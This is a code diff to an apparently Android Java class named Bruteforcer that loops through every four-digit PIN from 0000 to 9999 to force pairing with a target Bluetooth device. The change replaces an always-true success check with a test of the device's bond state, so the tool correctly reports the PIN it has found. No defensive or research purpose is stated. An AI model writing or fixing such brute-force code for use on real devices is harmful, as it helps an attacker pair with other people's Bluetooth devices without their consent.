@@ -27,7 +27,7 @@ public class Bruteforcer {
         while(range <= 9999 && !correct) {
             // Try this pin
             this.tryPin = range;
-            if(isConnected(target)) {
+            if(isPaired(target)) {
                 this.result = range;
                 pin.setText("Pin found: "+formatPin(range));
                 correct = true;
@@ -60,17 +60,19 @@ public class Bruteforcer {
         return pinFormatted;
     }
 
-    public Boolean isConnected(BluetoothDevice target) {
-        Boolean connected = false;
+    public Boolean isPaired(BluetoothDevice target) {
+        Boolean paired = false;
         try {
             // Start pairing with device
             target.createBond();
-            connected = true;
+            if(target.getBondState() == BluetoothDevice.BOND_BONDED) {
+                paired = true;
+            }
             // Pairing finished
         } catch (Exception e) {
             e.printStackTrace();
         }
-        return connected;
+        return paired;
     }
 
     private final BroadcastReceiver mPairingRequestReceiver = new BroadcastReceiver() {
